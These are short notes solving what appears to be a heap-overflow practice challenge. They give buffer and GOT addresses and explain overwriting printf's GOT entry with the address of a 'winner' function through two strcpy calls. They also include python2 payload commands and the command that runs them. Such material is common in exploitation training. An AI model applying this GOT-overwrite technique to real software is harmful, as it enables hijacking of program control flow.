name1 buffer = 0x00000000004052c0

name2 buffer = 0x0000000000405300

strct 1 = 0x4052a0

strct 2 = 0x4052e0

we will use the first strcpy to overwrite the pointer to name2 buffer

and place the GOT address for printf

and use the second strcpy to overwrite the GOT address

and printf is called after it

printf address 

nm ./program
0000000000404028 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5

0x0000000000404028 hold the pointer to puts functions in GOT table

winner 0x401290

python2 -c "from pwn import *;print('A'*40 + '\x28\x40\x40')" > pay1

python2 -c "from pwn import *;print('\x90\x12\x40')" > pay2

./program $(cat pay1) $(cat pay2)
